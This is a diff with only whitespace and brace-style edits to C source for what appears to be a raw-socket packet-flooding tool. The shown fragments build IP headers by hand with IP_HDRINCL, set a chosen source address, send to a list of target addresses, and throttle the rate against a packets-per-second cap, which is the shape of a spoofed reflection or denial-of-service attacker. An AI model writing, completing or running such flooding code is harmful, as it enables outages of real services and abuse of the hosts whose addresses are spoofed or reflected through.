@@ -19,7 +19,7 @@ struct list
 	struct sockaddr_in data;
 	struct list *next;
 	struct list *prev;
-}*head;
+} *head;
 
 volatile int tehport;
 volatile int limiter;
@@ -53,7 +53,6 @@ uint32_t rand_cmwc(void)
 	t = a * Q[i] + c;
 	c = (t >> 32);
 	x = t + c;
-
 	if (x < c)
 	{
 		x++;
@@ -103,14 +102,12 @@ void *flood(void *par1)
 	struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
 	struct sockaddr_in sin = td->sin;
 	struct  list *list_node = td->list_node;
-
 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 	if (s < 0)
 	{
 		fprintf(stderr, "Could not open raw socket.\n");
 		exit(-1);
 	}
-
 	init_rand(time(NULL));
 	memset(datagram, 0, MAX_PACKET_SIZE);
 	setup_ip_header(iph);
@@ -119,7 +116,6 @@ void *flood(void *par1)
 	iph->saddr = sin.sin_addr.s_addr;
 	iph->daddr = list_node->data.sin_addr.s_addr;
 	iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
-
 	int tmp = 1;
 	const int *val = &tmp;
 	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
@@ -127,7 +123,6 @@ void *flood(void *par1)
 		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
 		exit(-1);
 	}
-
 	init_rand(time(NULL));
 	register unsigned int i = 0;
 
@@ -215,7 +210,8 @@ int main(int argc, char *argv[])
 	for (i = 0; i < (atoi(argv[6])*multiplier); i++)
 	{
 		usleep((1000 / multiplier) * 1000);
-		if ((pps*multiplier) > maxpps) {
+		if ((pps*multiplier) > maxpps)
+		{
 			if (1 > limiter) {
 				sleeptime += 100;
 			} else {
@@ -223,7 +219,8 @@ int main(int argc, char *argv[])
 			}
 		} else {
 			limiter++;
-			if (sleeptime > 25) {
+			if (sleeptime > 25)
+			{
 				sleeptime -= 25;
 			} else {
 				sleeptime = 0;
